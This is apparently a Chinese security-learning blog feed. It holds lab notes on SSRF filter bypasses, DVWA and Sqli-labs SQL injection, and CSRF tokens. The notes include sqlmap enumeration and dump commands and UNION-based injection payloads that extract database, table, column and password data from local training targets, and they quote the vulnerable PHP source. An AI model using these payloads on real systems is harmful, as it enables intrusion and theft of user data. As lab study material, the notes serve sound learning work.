href="#SSRF-漏洞中URL地址过滤的绕过" class="headerlink" title="SSRF 漏洞中URL地址过滤的绕过"></a>SSRF 漏洞中URL地址过滤的绕过</h2><p>1）<code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code> 请求是相同的</p><p><a href="http://p9.qhimg.com/t0156e722ce8229ee37.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t0156e722ce8229ee37.png" alt="img"></a></p><p>此脚本访问请求得到的内容都是<code>www.baidu.com</code>的内容。 </p><p>2）ip地址转换成进制来访问</p><p><a href="http://p0.qhimg.com/t01463b751ace2a25f1.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01463b751ace2a25f1.png" alt="img"></a></p><p>此脚本解析的地址都是 115.239.210.26，也可以使用ping 获取解析地址：</p><p><a href="http://p8.qhimg.com/t01463bbf60442953e7.png" target="_blank" rel="noopener"><img src="http://p8.qhimg.com/t01463bbf60442953e7.png" alt="img"></a></p><p>如果WEB服务简单的过滤参数中获取的URL地址，没有判断真正访问的地址，是有可能被此两种方法绕过的。</p><p><a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="noopener">参考的博客：http://bobao.360.cn/learning/detail/240.html</a></p><p><a href="http://drops.wooyun.org/tips/750" target="_blank" rel="noopener">过滤参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSRF漏洞学习&quot;&gt;&lt;a href=&quot;#SSRF漏洞学习&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞学习&quot;&gt;&lt;/a&gt;SSRF漏洞学习&lt;/h1&gt;&lt;h2 id=&quot;什么是SSRF？&quot;&gt;&lt;a href=&quot;#什么是SSRF？&quot; class=&quot;head
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Dvwa SQL注入（sqlmap的使用）</title>
    <link href="http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/</id>
    <published>2020-05-14T12:37:13.436Z</published>
    <updated>2020-05-14T07:29:35.969Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Dvwa-SQL注入（sqlmap的使用）"><a href="#Dvwa-SQL注入（sqlmap的使用）" class="headerlink" title="Dvwa SQL注入（sqlmap的使用）"></a>Dvwa SQL注入（sqlmap的使用）</h1><p>Sqlmap中文手册（讲得非常详细）参考链接：<a href="https://blog.csdn.net/wn314/article/details/78872828" target="_blank" rel="noopener">https://blog.csdn.net/wn314/article/details/78872828</a></p><p>1.输入sqlmap.py –u url –dbs （URL是输入id后的页面的url，也就是提交过数据的页面的url）不行所以得加上cookie（按f12后打开火狐浏览器的开发者工具-网络栏-点击网络栏下面一行右边会弹出框框-点击Cookie栏即可找到cookie）</p><p>所以输入：</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>得到目标所有数据库名</p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152522663.png" alt="image-20200514152522663" style="zoom: 150%;"><p>（备注：（1）关于cookie，有两种情况sqlmap会用到：</p><p>1.要测试的页面只有在登录状态下才能访问，登录状态用cookie识别</p><p>2.想要检测是否存在cookie注入</p><p>（2）-u参数表示url，指定连接目标</p><p>–dbs表示列出目标有哪些数据库）</p><p>2.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –tables</code></p><p>得到数据库内所有表</p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20200514152600062.png" alt="image-20200514152600062" style="zoom:150%;"><p>（备注：（1）-D：指定数据库</p><p>-tables：列举数据库中所有表）</p><p>3.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --columns</code></p><p>得到表中所有字段名及类型</p><p><img src="/2020/05/14/Dvwa%20SQL%E6%B3%A8%E5%85%A5%EF%BC%88sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200514152654013.png" alt="image-20200514152654013"></p><p>（备注：（1）-T，指定表</p><p>–columns，指定表中所有列的名字和数据类型）</p><p>4.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users --count</code></p><p>得到表中的数据总数</p><p>![说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle$)H2{E11@~2QE)`5CXPJ%WS.png](file:///C:\Users\DELL\AppData\Local\Temp\msohtmlclip1\01\clip_image002.jpg)</p><p>5.输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; -D dvwa –T users –dump</code></p><p>得到所有数据</p><p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CLocal%5CTemp%5Cmsohtmlclip1%5C01%5Cclip_image004.jpg" alt="说明: C:\Users\DELL\AppData\Roaming\Tencent\Users\481820058\QQ\WinTemp\RichOle\P)FU4(F5RSOJT4VAQV}U1IC.png"></p><p>备注：（1）–dump，列举数据。它也会保存数据到CSV格式文件中，文件具体路径会在输出中给出。</p><p>参考题解：<a href="https://blog.csdn.net/weixin_42555985/article/details/87546621" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42555985/article/details/87546621</a></p><p>Medium级别：</p><p>1.需要自己加入id=…（因为提交后的url里面没有  ?id=…  ，所以得自己补充）</p><p>如：第一步输入</p><p><code>sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1&amp;submit=submit&quot; --cookie &quot;security=medium;PHPSESSID=kstq7p8bu6qnsvqc2ol5rhjd7i&quot; –dbs</code></p><p>2.接下去的步骤同上</p><p>High级别：同medium级别</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Dvwa-SQL注入（sqlmap的使用）&quot;&gt;&lt;a href=&quot;#Dvwa-SQL注入（sqlmap的使用）&quot; class=&quot;headerlink&quot; title=&quot;Dvwa SQL注入（sqlmap的使用）&quot;&gt;&lt;/a&gt;Dvwa SQL注入（sqlmap的使用）&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>DVWA SQL injection</title>
    <link href="http://yoursite.com/2020/05/14/DVWA%20SQL%20injection/"/>
    <id>http://yoursite.com/2020/05/14/DVWA%20SQL%20injection/</id>
    <published>2020-05-14T12:37:04.240Z</published>
    <updated>2020-05-13T07:18:46.930Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-SQL-injection"><a href="#DVWA-SQL-injection" class="headerlink" title="DVWA SQL injection"></a>DVWA SQL injection</h1><h2 id="Low级别"><a href="#Low级别" class="headerlink" title="Low级别"></a>Low级别</h2><h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { //isset()函数用于检测变量是否已设置并且非null。被设置返回TRUE；REQUEST用于获取表单数据，表单属性名为submit，判断是否存在    // Get input     $id = $_REQUEST[ &#39;id&#39; ]; //定义变量id存传过来的id数据    // Check database $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; //按照id值找first_name,last_name的值    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); //mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询//connection：MySQL连接，query规定查询字符串，resultmode可省//result存数据//or后面是判断是否连接成功，三元判断，执行了就返回真    // Get results     while( $row = mysqli_fetch_assoc( $result ) ) {         // Get values         $first = $row[&quot;first_name&quot;];         $last  = $row[&quot;last_name&quot;];         // Feedback for end user //打印输出结果        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     }     mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); //关闭数据库连接}?&gt;</code></pre><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>1.判断是否存在注入</p><p>2.判断字段数 order by</p><p>输入1’order by2#    两个字段</p><p>问题1：为什么不能用–+，在http请求中不是不允许出现#吗，可是这边#怎么能用?</p><p>答：（还搞不清楚）</p><p>3.联合查询注入</p><p>1)输入-1’union select2,3#发现两个位置均能显示</p><p>4.payload</p><p>1)输入 -1’union select user(),database()# 注当前用户名和数据库名</p><p>2)输入</p><p>-1’ union select 1,group_concat(TABLE_NAME,0x3c2f62723e) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#</p><p>遇到提示：Error: Illegal mix of collations for operation ‘UNION’，这种错误的成因是因为编码的缘故，字符集的编码不同所导致的，要解决就配合convart、using latin1函数来解决。</p><p>（<a href="https://blog.csdn.net/qq_35569814/article/details/100274561" target="_blank" rel="noopener">这边参考的题解</a>）</p><p>CONVERT() 函数是把日期转换为新数据类型的通用函数。</p><p>大致poyload如下</p><p>UNION SELECT 1,2,3,4,5,6,7,convert(Table_Name using latin1) from information_schema.tables Where table_Schema=database()–+</p><p>故改成输入</p><p>-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p><p><img src="/2020/05/14/DVWA%20SQL%20injection/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200501004352747.png" alt></p><p>3)输入</p><p> -1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p><p>得到表中字段名</p><p>4）输入</p><p>-1’ union select 1,convert(user using latin1) from users#</p><p>得到字段值</p><p><a href="http://www.langzi.fun/DVWA源码解读之SQL-Injection.html" target="_blank" rel="noopener">参考的题解</a></p><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) {     // Get input     $id = $_POST[ &#39;id&#39; ];     $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // mysqli_real_escape_string(connection,escapestring) 函数转义在 SQL 语句中使用的字符串//中的特殊字符。//$GLOBALS[ ]是所有已定义全局变量组成的数组。$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; //由$query此句可知输入的id不用特殊字符    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); //mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询//connection：MySQL连接，query规定查询字符串，resultmode可省//result存数据//or后面是判断是否连接成功，三元判断，执行了就返回真  // Get results while( $row = mysqli_fetch_assoc( $result ) ) { //mysqli_fetch_assoc(result)函数从结果集中取得一行作为关联数组。//返回的字段名区分大小写，每个字段名做为row的键名，数据是对应的单元值。所以才有$row[&quot;first_name&quot;]这种形式出来        // Display values         $first = $row[&quot;first_name&quot;];         $last  = $row[&quot;last_name&quot;];         // Feedback for end user         echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query  = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); $number_of_rows = mysqli_fetch_row( $result )[0]; //不是很理解为什么还要搞出这么一段，为什么要查询全部字段并存到result？mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt;</code></pre><h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：数字型注入（因为网站没法输入，故下面的步骤都用burpsuite，其余步骤与low级别差不多，同样得配合convert函数，否则会出错）（用burpsuite的意思是直接在burpsuite的界面操作，send to repeater之后点击action）</p><p>2.判断字段数</p><p>输入1 order by 1# 两个字段</p><p>3.联合查询注入</p><p>输入1 union select 1,2# 发现两个位置都可以显示</p><p>问题2：为什么不用把1改成-1呢？之前看到的说法是前边出错才能执行后面的，可是我觉得没出错也能执行后面的啊？</p><p>答：因为sqli-labs是只能显示一条记录（mysql_fetch_array()仅被调用一次），如果前面是1的话会显示1而不显示后边的操作结果，dvwa不只显示一条记录（mysqli_fetch_assoc()可多次调用），所以-1或者1无所谓。</p><p>4.payload</p><p>1）输入1 union select 1,database()#注数据库名</p><p>2）输入1 union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=database()#注表名</p><p>这边得用database()，因为单引号会被转义。</p><p>3）输入1 union select 1,convert(column_name using latin1) from information_schema.columns where table_name=0x7573657273 # 注表中字段名</p><p><a href="http://www.mamicode.com/info-detail-2778166.html" target="_blank" rel="noopener">用十六进制进行绕过，SQL绕过基础</a></p><p>4）输入1 union select user,password from users#得字段值</p><p><a href="https://www.cnblogs.com/amberhome-wei/p/12048339.html" target="_blank" rel="noopener">参考题解</a></p><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_SESSION [ &#39;id&#39; ] ) ) {//session变量用于存储储关于用户会话（session）的信息，或者更改用户会话（session）的设置。所以才能弹出另一个窗口出来。 // Get input    $id = $_SESSION[ &#39;id&#39; ];    // Check database$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; );////mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询。//$GLOBALS[&quot;___mysqli_ston&quot;]只是一个自定义全局变量？//mysqli_ston是哪里来的呢？上面也完全没提到，所以是连接数据库？    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;    }((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);    //is_null() 检测变量是否为null；// 注意：空字符串：已经分配了存储空间，但是没有存储东西;NULL：没有分配存储空间。  //}?&gt;</code></pre><h4 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：字符型注入</p><p>没有给出确切的错误信息，但试过发现跟low级别的解题过程没什么区别。</p><p>2.判断字段数：输入1’ order by 3# 两个字段</p><p>3.联合查询注入: -1’ union select 1,2 #</p><p>4.payload:</p><p>1）输入-1’ union select 1,database()# 注数据库名</p><p>2）输入-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p><p>3）输入-1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p><p>得到表中字段名</p><p>4）输入</p><p>-1’ union select 1,convert(user using latin1) from users#</p><p>得到字段值</p><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Submit&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );//这句是为了防止CSRF攻击，即防止跨站点请求伪造攻击，CSRF相关注释在下边//token解释在下边    // Get input    $id = $_GET[ &#39;id&#39; ];    // Was a number entered?if(is_numeric( $id )) {//is_numeric() 函数用于检测变量是否为数字或数字字符串。        // Check the database        $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );//这个是预编译//预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程。预编译语句能防止sql注入。//在impossible.php中还限制了只允许返回一条数据。就是if( $data-&gt;rowCount() == 1 ) 。        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );        $data-&gt;execute();        $row = $data-&gt;fetch();        // Make sure only 1 result is returned        if( $data-&gt;rowCount() == 1 ) {            // Get values            $first = $row[ &#39;first_name&#39; ];            $last  = $row[ &#39;last_name&#39; ];            // Feedback for end user            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;        }    }}// Generate Anti-CSRF tokengenerateSessionToken();//在登录界面/var/www/html/login.php和本页面都能生成Token//具体的函数在dvwaPhpIds.inc.php中，验证在impossible.php（就是本篇代码）中//请注意：要避免&quot;加token但不进行校验&quot;的情况。在session中增加了token，但服务端没//有对token进行验证，那根本起不到防范的作用。提交的浏览器的URL每次的token都是//不一样的。?&gt;</code></pre><p>1.Check Anti-CSRF token：</p><p>（1）CSRF，Cross Site Request Forgery，中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><p>CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。</p><p>CSRF攻击的一般是由服务端解决。</p><p>应对CSRF的方法有</p><p>1）尽量使用POST，限制GET</p><p>2）浏览器Cookie策略</p><p>3）加验证码</p><p>4）Referer Check ，例如：防止图片盗链</p><p>5）Anti CSRF Token</p><p>上面的代码用的是第5点。</p><p>（2）Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。这样可以减轻服务器的压力，减少频繁的查询数据库。</p><p>使用Token有2种方式：</p><p>1）用设备号/设备mac地址作为Token</p><p>2）用session值作为Token用session值作为Token</p><p>Token的好处是服务端不需要存储相应信息。</p><p>大概的流程是这样的：</p><p>1）客户端使用用户名跟密码请求登录</p><p>2）服务端收到请求，去验证用户名与密码</p><p>3）验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p><p>4）客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p><p>5）客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p><p>6）服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p><p>当然，如果Token被不怀好意的人从中间获取到该信息时，也容易被利用，非法获取数据。 想增强安全性，一般可以在服务端生成时配合时间戳，服务端在接收到client发来带token的信息时，先检测token的时间戳信息，如果该时间戳在超过某个时间点时，就认为过期，需要重新获取。</p><p>Token一般用在两个地方:</p><p>1）防止表单重复提交：服务器端第一次验证相同过后，会将session中的Token值更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</p><p>2）anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</p><p><a href="https://www.pianshen.com/article/2567257653/" target="_blank" rel="noopener">参考博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-SQL-injection&quot;&gt;&lt;a href=&quot;#DVWA-SQL-injection&quot; class=&quot;headerlink&quot; title=&quot;DVWA SQL injection&quot;&gt;&lt;/a&gt;DVWA SQL injection&lt;/h1&gt;&lt;h2 id=&quot;L
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs（1-5关）</title>
    <link href="http://yoursite.com/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/</id>
    <published>2020-05-14T12:27:03.753Z</published>
    <updated>2020-05-23T10:46:24.247Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs（1-5关）"><a href="#Sqli-labs（1-5关）" class="headerlink" title="Sqli-labs（1-5关）"></a>Sqli-labs（1-5关）</h1><p><a href="https://baike.baidu.com/item/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/4766224?fr=aladdin#2" target="_blank" rel="noopener">基本的百度百科SQL注入攻击概念理解  参考链接</a></p><p>很好的SQL注入步骤讲解<a href="https://www.cnblogs.com/puhk/p/12674740.html" target="_blank" rel="noopener"> 参考链接：https://www.cnblogs.com/puhk/p/12674740.html</a></p><p>SQL注入方式：数字型和字符型。</p><p>参考博客的链接：<a href="https://www.cnblogs.com/xyhacker/p/10022858.html" target="_blank" rel="noopener">https://www.cnblogs.com/xyhacker/p/10022858.html</a></p><p>判断方式：</p><blockquote><p>1、数字型注入</p><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><p>测试步骤：(<strong>记得输入法改为中文！！</strong>)</p><p>（1） 加单引号，URL：<code>www.text.com/text.php?id=3’</code></p><p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1=1 ,URL：<code>www.text.com/text.php?id=3 and 1=1</code></p><p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p><p>（3） 加and 1=2，URL：<code>www.text.com/text.php?id=3 and 1=2</code></p><p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>如果满足以上三点，则可以判断该URL存在数字型注入。</p><p>2、字符型注入</p><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><p>例如数字型语句：select * from table where id =3</p><p>则字符型如下：select * from table where name=’admin’</p><p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name=’admin’’</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p><p>Mysql 有三种常用注释符：</p><p>– 注意，这种注释符后边有一个空格</p><p># 通过#进行注释</p><p>/* */ 注释掉符号内的内容</p><p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p><p>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错</p><p>如果满足以上三点，可以判断该url为字符型注入。</p></blockquote><p><strong>常用系统函数</strong></p><ol><li>version()——MySQL 版本</li><li>user()——数据库用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p><strong>字符串连接函数</strong></p><ol><li>concat(str1,str2,…)——没有分隔符地连接字符串</li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据     说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</li></ol><p>一般用于测试是否存在注入</p><pre><code>?? and 1=2–+‘and 1=2–+“and 1=2–+)and 1=2–+‘)and 1=2–+“)and 1=2–+“))and 1=2–+</code></pre><p>一般的代码为： $id=$_GET[‘id’]; $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p><p>(<strong>下面有的符号我打进去的时候没有改成英文输入法，所以直接复制可能有错</strong>)</p><h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><h4 id="1-判断是数字型还是字符型"><a href="#1-判断是数字型还是字符型" class="headerlink" title="1.判断是数字型还是字符型"></a>1.判断是数字型还是字符型</h4><p> 得字符型</p><p><img src="/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513205214145.png" alt="image-20200513205214145"></p><p><strong>问题1：我不是很理解报错这句话limit后面的意思，不明白1后面为啥有个单引号？</strong></p><p>翻译（从right开始）：在第1行“1”限制0,1附近使用的正确语法。</p><p>源码是  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; （源码在文件夹里边的index.php看）</p><p>输入1’后变成$sql=”SELECT * FROM users WHERE id=’1’’ LIMIT 0,1 ‘’ </p><p>我的想法：分别输入id=’1、1’、’’’1、’1 ,推测出报错格式应该如下，…use near ’id等号后面的内容’ at line 1;所以在不看源码的情况下我们才能推到源码会是id=’网页输入的内容’</p><h4 id="2-猜字段数（用order-by排序-数字一个一个试）"><a href="#2-猜字段数（用order-by排序-数字一个一个试）" class="headerlink" title="2.猜字段数（用order by排序 数字一个一个试）"></a>2.猜字段数（用order by排序 数字一个一个试）</h4><p>即输入?id=1’order by 4–+ </p><p>错误，多次尝试知晓只有三个字段（三个列）</p><p><strong>问题2：为什么用–+呢？</strong></p><p>答：为了注释掉后面的东西。#也可以注释，不用#的原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括#，将#号改成url的编码%23就可以了。（因为在<a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a> 这个XSS靶场 level2中我在url后输入”&gt;<script>alert(1)</script>#或者把#改成–+或– 或–space都可以过关，所以这边对于#用不了的解释存疑）使用–不行，原因–与后面的单引号连在一起没办法形成有效的SQL语句。还查到可以用–‘或–space注释掉,但是实践过发现– ‘（在’前加了个空格）或– space（space前加了个空格）才可行。</p><h4 id="3-联合查询"><a href="#3-联合查询" class="headerlink" title="3.联合查询"></a>3.联合查询</h4><p>即输入?id=-1’union select 3,2,1–+</p><p>发现后面两个位置，即上面2,1两处输入的东西可在网页上显示。</p><p>使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据（原因在下面），因此将 id = 1 改为 id = -1 （即把id值设为非正数（负数或0），浮点数，字符型或字符串）开始进行注入。</p><p>联合查询注入利用的前提条件：页面上有显示位</p><p><strong>问题3：什么是显示位？</strong></p><p>答：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p><p><strong>union前面的参数报错才能执行union后面的数据原因：</strong></p><pre><code>源码：$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysqli_query($con, $sql);$row = mysqli_fetch_array($result, MYSQLI_BOTH);    if($row)    {      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }</code></pre><p>mysqli_query(connection,query,resultmode); </p><p>connection</p><p>必需。规定要使用的 MySQL 连接。</p><p>query</p><p>必需，规定查询字符串。</p><p>resultmode</p><p>可选。一个常量。可以是下列值中的任意一个：</p><p>MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）</p><p>MYSQLI_STORE_RESULT（默认）</p><blockquote><p>mysql_fetch_array(<em>data</em>,<em>array_type</em>) 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成的数组，如果没有更多行则返回 